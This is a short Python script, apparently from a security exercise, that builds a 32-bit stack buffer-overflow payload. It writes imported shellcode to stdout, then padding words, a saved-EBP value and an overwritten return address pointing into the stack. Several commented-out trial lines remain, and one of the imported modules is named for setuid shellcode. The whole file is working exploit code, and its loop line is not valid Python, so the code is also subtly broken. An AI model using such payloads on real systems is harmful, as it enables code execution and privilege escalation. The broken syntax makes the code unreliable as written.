import sys
from shellcode3 import shellcode
from shellcode2 import setuid
from struct import pack
# sys.stdout.buffer.write(b"asdfasdfasd")
# sys.stdout.buffer.write(setuid)
sys.stdout.buffer.write(shellcode)

for (i in range(0, 24)):
	sys.stdout.buffer.write(pack("<I", 0x11))


# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf")
# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf")
# sys.stdout.buffer.write(b"asdfasdfas")
# sys.stdout.buffer.write(pack("<I", 0xbf11))
# sys.stdout.buffer.write(pack("<I", 0xbffe8535))
# sys.stdout.buffer.write(pack("<I", 0x11111111))

sys.stdout.buffer.write(pack("<I", 0xbffe85a8)) # is the ebp
sys.stdout.buffer.write(pack("<I", 0xbffe8535)) # is the return addr
# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdf")
# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdf")
# sys.stdout.flush()



